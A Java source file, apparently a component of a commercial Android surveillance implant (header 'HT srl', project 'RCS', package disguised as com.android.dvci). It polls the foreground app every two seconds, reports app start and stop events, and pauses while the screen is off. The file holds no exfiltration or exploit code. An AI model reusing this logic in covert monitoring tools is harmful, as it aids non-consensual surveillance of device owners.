/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerProcess.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import java.util.ArrayList;
import java.util.TreeMap;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import android.app.ActivityManager.RunningAppProcessInfo;
import android.view.ViewDebug;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.RunningProcesses;
import com.android.dvci.Standby;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;

public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
	private static final long PERIOD = 2000;

	String lastForeground = "";

	private boolean started;
	BroadcastMonitorProcess bmp = new BroadcastMonitorProcess();

	private Object standbyLock = new Object();
	private Object startedLock = new Object();

	/** The singleton. */
	private volatile static ListenerProcess singleton;
	private ScheduledFuture<?> future;
	private ScheduledExecutorService stpe = Status.getStpe();

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static ListenerProcess self() {
		if (singleton == null) {
			synchronized (ListenerProcess.class) {
				if (singleton == null) {
					singleton = new ListenerProcess();
				}
			}
		}

		return singleton;
	}

	public ListenerProcess() {
		super();

		synchronized (standbyLock) {
			ListenerStandby.self().attach(this);
			setSuspended(!ListenerStandby.isScreenOn());
		}
	}

	@Override
	protected void start() {

		synchronized (startedLock) {
			if (!started) {
				if (ListenerStandby.isScreenOn()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start)");
					}

					started = true;
					this.future = stpe.scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);

				}else{
					if (Cfg.DEBUG) {
						Check.log(TAG + " (start): screen off");
						setSuspended(true);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (start): already started");
				}
			}
		}

	}

	@Override
	protected void stop() {
		synchronized (startedLock) {
			if (started) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop)");
				}

				started = false;

				if (this.future != null) {
					//dispatch(new ProcessInfo("", ProcessStatus.STOP));
					this.future.cancel(true);
					this.future = null;
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): already stopped");
				}
			}
		}

	}

	public synchronized boolean isRunning(String appName){
		return lastForeground.equals(appName);
	}

	protected synchronized int dispatch(String currentForeground) {

		if(!currentForeground.equals(lastForeground)){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notification): started " + currentForeground);//$NON-NLS-1$
			}
			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));
			if(!StringUtils.isEmpty(lastForeground)){
				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
			}
			lastForeground = currentForeground;
		}

		return 0;
	}

	@Override
	public int notification(Standby b) {

		synchronized (standbyLock) {
			if (b.getStatus()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to resume");
				}

				resume();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification): try to suspend");
				}

				suspend();
			}
		}

		return 0;
	}


	class BroadcastMonitorProcess implements Runnable {

		/**
		 * The Constant TAG.
		 */
		private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$

		@Override
		public  void run() {

			String foreground = Status.self().getForeground();
			if (Cfg.DEBUG) {
				//Check.log(TAG + " (run) " + foreground);
			}
			dispatch(foreground);
		}

	};

}
